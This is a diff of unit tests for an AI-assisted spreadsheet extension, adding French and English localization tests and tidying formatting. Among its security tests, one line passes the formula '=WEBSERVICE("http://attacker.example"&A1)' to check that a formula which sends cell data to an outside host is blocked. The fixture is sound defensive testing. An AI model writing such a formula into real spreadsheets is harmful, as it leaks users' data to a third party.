@@ -1,8 +1,5 @@
 """
 Unit tests for src/mirai/menu_actions/calc.py
-
-Run with:
-    .venv/bin/pytest tests/unit/test_calc_menu_actions.py -v
 """
 import unittest
 from unittest.mock import MagicMock
@@ -11,7 +8,7 @@ from tests.stubs.uno_stubs import install
 
 install()
 
-from src.mirai.menu_actions.calc import (  # noqa: E402
+from src.mirai.menu_actions.calc import (
     _ERR_PREFIX,
     _analyze_range,
     _apply_formula,
@@ -24,14 +21,13 @@ from src.mirai.menu_actions.calc import (  # noqa: E402
     _get_cell_error,
     _is_formula_safe,
     _looks_like_prompt_injection,
+    _range_label,
     _safe_formula_functions,
     _transform_to_column,
     handle_calc_action,
 )
 
-# ---------------------------------------------------------------------------
 # Helpers
-# ---------------------------------------------------------------------------
 
 def _make_cell(text=""):
     """Stateful fake cell: getString/setString mirror a real cell."""
@@ -74,9 +70,7 @@ def _make_job(stream_chunks=None):
     return job
 
 
-# ---------------------------------------------------------------------------
 # _extend_cells
-# ---------------------------------------------------------------------------
 
 class TestExtendCells(unittest.TestCase):
 
@@ -100,9 +94,7 @@ class TestExtendCells(unittest.TestCase):
         self.assertIn("boom", cells[(0, 0)].getString())
 
 
-# ---------------------------------------------------------------------------
 # _edit_cells
-# ---------------------------------------------------------------------------
 
 class TestEditCells(unittest.TestCase):
 
@@ -120,9 +112,7 @@ class TestEditCells(unittest.TestCase):
         self.assertIn("fail", cells[(0, 0)].getString())
 
 
-# ---------------------------------------------------------------------------
 # _transform_to_column
-# ---------------------------------------------------------------------------
 
 class TestTransformToColumn(unittest.TestCase):
 
@@ -165,9 +155,7 @@ class TestTransformToColumn(unittest.TestCase):
         self.assertEqual(cells[(3, 0)].getString(), "ok")
 
 
-# ---------------------------------------------------------------------------
 # _generate_formula
-# ---------------------------------------------------------------------------
 
 class TestGenerateFormula(unittest.TestCase):
 
@@ -216,9 +204,7 @@ class TestGenerateFormula(unittest.TestCase):
         target.setFormula.assert_not_called()
 
 
-# ---------------------------------------------------------------------------
 # _analyze_range
-# ---------------------------------------------------------------------------
 
 class TestAnalyzeRange(unittest.TestCase):
 
@@ -274,9 +260,7 @@ class TestAnalyzeRange(unittest.TestCase):
         self.assertTrue(out_cell.getString().startswith(_ERR_PREFIX))
 
 
-# ---------------------------------------------------------------------------
 # handle_calc_action — routing
-# ---------------------------------------------------------------------------
 
 class TestHandleCalcAction(unittest.TestCase):
 
@@ -302,13 +286,6 @@ class TestHandleCalcAction(unittest.TestCase):
         job = _make_job()
         model = MagicMock(spec=[])  # no Sheets attribute
         self.assertFalse(handle_calc_action(job, "ExtendSelection", model))
-
-    def test_settings_opens_dialog_and_returns_true(self):
-        job = _make_job()
-        model, *_ = self._make_model()
-        result = handle_calc_action(job, "settings", model)
-        self.assertTrue(result)
-        job.settings_box.assert_called_once()
 
     def test_extend_selection_calls_extend_cells(self):
         job = _make_job(["ext"])
@@ -371,7 +348,7 @@ class TestHandleCalcAction(unittest.TestCase):
 
     def test_always_returns_true_for_known_args(self):
         for arg in ("ExtendSelection", "EditSelection", "TransformToColumn",
-                    "AnalyzeRange", "GenerateFormula", "settings"):
+                    "AnalyzeRange", "GenerateFormula"):
             job = _make_job()
             job.input_box.return_value = "x"
             # GenerateFormula: mock does nothing (on_generate never called)
@@ -383,9 +360,7 @@ class TestHandleCalcAction(unittest.TestCase):
             self.assertTrue(result, msg=f"Expected True for arg={arg!r}")
 
 
-# ---------------------------------------------------------------------------
 # _get_cell_error
-# ---------------------------------------------------------------------------
 
 class TestGetCellError(unittest.TestCase):
 
@@ -407,9 +382,7 @@ class TestGetCellError(unittest.TestCase):
         self.assertEqual(_get_cell_error(cell), "")
 
 
-# ---------------------------------------------------------------------------
 # _build_schema_context
-# ---------------------------------------------------------------------------
 
 class TestBuildSchemaContext(unittest.TestCase):
 
@@ -461,9 +434,7 @@ class TestBuildSchemaContext(unittest.TestCase):
         self.assertIsInstance(ctx, str)
 
 
-# ---------------------------------------------------------------------------
 # _is_formula_safe / _safe_formula_functions — AI-formula allow-list
-# ---------------------------------------------------------------------------
 
 class TestSafeFormulaFunctions(unittest.TestCase):
 
@@ -537,9 +508,7 @@ class TestIsFormulaSafe(unittest.TestCase):
         self.assertFalse(ok)
 
 
-# ---------------------------------------------------------------------------
 # _apply_formula — enforcement point
-# ---------------------------------------------------------------------------
 
 class TestApplyFormulaSecurity(unittest.TestCase):
 
@@ -570,9 +539,7 @@ class TestApplyFormulaSecurity(unittest.TestCase):
         self.assertIn("BLOCKED", logged)
 
 
-# ---------------------------------------------------------------------------
 # _fill_formula_down — enforcement point (replication)
-# ---------------------------------------------------------------------------
 
 class TestFillFormulaDownSecurity(unittest.TestCase):
 
@@ -587,7 +554,8 @@ class TestFillFormulaDownSecurity(unittest.TestCase):
         """out_col=0 (empty, to be filled); col 1 holds data for rows 1-3 so
         the has_data check doesn't stop the fill loop early."""
         sheet, cells = _make_sheet({(1, r): "y" for r in range(1, 4)})
-        cols = MagicMock(); cols.Count = 2
+        cols = MagicMock()
+        cols.Count = 2
         sheet.getColumns.return_value = cols
         return sheet, cells
 
@@ -604,14 +572,12 @@ class TestFillFormulaDownSecurity(unittest.TestCase):
         job = _make_job()
         area = self._make_area()
         _fill_formula_down(job, sheet, '=WEBSERVICE("http://attacker.example"&A1)', area)
-        for pos, cell in cells.items():
+        for cell in cells.values():
             cell.setFormula.assert_not_called()
         self.assertNotIn((0, 1), cells)  # out-col cell never even fetched
 
 
-# ---------------------------------------------------------------------------
 # _looks_like_prompt_injection / _build_schema_context hardening
-# ---------------------------------------------------------------------------
 
 class TestPromptInjectionDetection(unittest.TestCase):
 
@@ -640,9 +606,11 @@ class TestBuildSchemaContextHardening(unittest.TestCase):
     def _make_sheet_with_data(self, header="Nom"):
         data = {(0, 0): header, (0, 1): "Alice", (0, 2): "Bob"}
         sheet, _ = _make_sheet(data)
-        cols = MagicMock(); cols.Count = 1
+        cols = MagicMock()
+        cols.Count = 1
         sheet.getColumns.return_value = cols
-        rows = MagicMock(); rows.Count = 5
+        rows = MagicMock()
+        rows.Count = 5
         sheet.getRows.return_value = rows
         return sheet
 
@@ -666,9 +634,7 @@ class TestBuildSchemaContextHardening(unittest.TestCase):
         self.assertIsInstance(ctx, str)
 
 
-# ---------------------------------------------------------------------------
 # GenerateFormula multi-turn loop (handle_calc_action)
-# ---------------------------------------------------------------------------
 
 class TestGenerateFormulaMultiTurn(unittest.TestCase):
 
@@ -723,6 +689,46 @@ class TestGenerateFormulaMultiTurn(unittest.TestCase):
         sheet.getCellByPosition.return_value = _make_cell()
         result = handle_calc_action(job, "GenerateFormula", model)
         self.assertTrue(result)
+
+
+# ---------------------------------------------------------------------------
+# _range_label localization
+# ---------------------------------------------------------------------------
+
+def _make_area(sc, ec, sr, er):
+    area = MagicMock()
+    area.StartColumn = sc
+    area.EndColumn = ec
+    area.StartRow = sr
+    area.EndRow = er
+    return area
+
+
+class TestRangeLabelI18n(unittest.TestCase):
+
+    def test_many_cells_french(self):
+        from src.mirai import i18n
+        i18n.set_locale("fr")
+        self.assertEqual(
+            _range_label(_make_area(0, 3, 0, 4)),
+            "20 cellules sélectionnées (A1:D5)",
+        )
+
+    def test_single_cell_singular(self):
+        from src.mirai import i18n
+        i18n.set_locale("fr")
+        self.assertEqual(
+            _range_label(_make_area(0, 0, 0, 0)),
+            "1 cellule sélectionnée (A1:A1)",
+        )
+
+    def test_english_and_no_leftover_placeholder(self):
+        from src.mirai import i18n
+        i18n.set_locale("en")
+        label = _range_label(_make_area(0, 3, 0, 4))
+        self.assertIn("20 selected cells", label)
+        self.assertIn("(A1:D5)", label)
+        self.assertNotIn("{", label)
 
 
 if __name__ == "__main__":
